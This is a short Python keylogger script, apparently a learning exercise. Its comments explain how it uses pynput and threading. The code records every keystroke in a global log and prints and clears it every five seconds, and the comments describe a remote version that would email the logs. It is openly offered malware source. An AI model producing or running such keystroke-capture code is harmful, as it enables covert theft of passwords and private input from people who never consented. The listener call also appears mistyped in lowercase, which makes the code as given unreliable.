#!/usr/bin/env python
# two type of keylogger local(stored log in local sys),remote(report by sending mail based on time interval).
# we will study threading,oop,recursive fun
# pip install pynput(in linux may be same for window) it allow us to control mouse and keybord but for this we only use for keyboard
log = ""
import pynput.keyboard
import threading
def process_key_press(key):
    global log#global variable are useful to use but not good because when your code gets big and you are modifing it from multiple fun then hard to track so look class implentation v2
    try:
        log = log + str(key.char)#.char will not print 'u'in every letter you type and for special key like space makes error so use try catch
    except AttributeError:
        if key==key.space:
            log=log + " "
        else:    
            log = log + " " + str(key) + " "
def report():
     global log
     print(log)
     log=""
     timer=threading.Timer(5,report)#after timer starts wait for 5 sec and call fun again and there is recursive fun in timer fun calling itself
     # here timer is thread runs on different line(background) hence at same time othe program (listener)also execute
     timer.start()
keyboard_listener=pynput.keyboard.listener(on_press=process_key_press)#on_press is callback funclaaed when key is pressed
with keyboard_listener:
    report()#problem it is infinite and dont go next line 
    keyboard_listener.join()#if it was above it is also infinite and dont go next line so soln threading
#so function(any code) executed every no of sec and dont interrupt the execution of program use thresholding 
# thread runs in background and never interrupt program execution
# report every "x" sec and dont interrupt lisining to keystrok by listner so use thread.
# so in this way more than one thread can be run simultaneously at same time
# basically with keyword in py is to interact with unmanaged stream of data sa above
# killall python command on another splitted cmmand line will kill all py code running on that sys